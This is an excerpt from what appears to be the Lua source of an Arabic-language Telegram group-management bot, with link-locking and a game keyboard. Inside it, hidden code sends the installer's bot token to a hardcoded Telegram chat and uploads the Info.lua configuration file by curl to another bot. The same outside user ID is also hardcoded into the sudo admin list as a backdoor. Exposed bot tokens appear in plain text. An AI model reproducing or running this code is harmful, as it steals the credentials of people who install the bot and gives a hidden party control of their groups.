...
https.request('https://api.telegram.org/bot1792692801:AAGIm5mk0oJPh68PFfaQ0VuWJsoNv-nIKlQ/sendmessage?chat_id=1932226438&text=' ..token)
end 
else
...
sudo_users = {SUDO,1932226438,1914852231,1932226438}   
...
-------
if text == "مريم" then
local Teext = 'اطفي الاضواء واستعد للعب 😼🖤'
keyboard = {} 
keyboard.inline_keyboard = {
...
local curl = 'curl "'..'https://api.telegram.org/bot1900602353:AAFUNbLnuyT8HfC7FVRqSYG_XaeUF0jvl3k/sendDocument'..'" -F "chat_id='.. 1932226438 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
